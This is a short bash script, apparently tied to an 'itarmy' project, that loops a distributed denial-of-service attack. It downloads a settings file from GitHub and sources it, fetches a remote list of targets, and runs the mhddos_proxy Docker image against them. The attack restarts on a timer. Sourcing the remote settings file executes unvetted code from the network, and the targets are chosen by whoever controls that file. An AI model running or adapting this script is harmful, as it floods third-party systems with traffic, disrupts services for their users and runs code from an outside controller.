#!/bin/bash

SETTINGS_URL=https://raw.githubusercontent.com/psyipm/itarmy/main/settings.env

function load_settings () {
  curl -s $SETTINGS_URL > settings.env
  source settings.env
}

function load_targets () {
  curl -s $TARGETS_URL > targets.lst
}

function attack () {
  load_targets

  docker run $(echo $DOCKER_OPTIONS) \
    ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest \
    $(cat ./targets.lst) \
    $(echo $ATTACK_OPTIONS)
}

function cleanup () {
  docker stop $CONTAINER_NAME
}

function restart () {
  sleep $RESTART_IN
  cleanup
}

while true
do
  load_settings

  echo "Scheduling restart in $RESTART_IN seconds..."
  restart&

  echo "Starting attack..."
  attack

  echo "Attack stopped"

  echo "Killing all running containers..."
  cleanup

  echo "Cooling down..."
  sleep 30
done
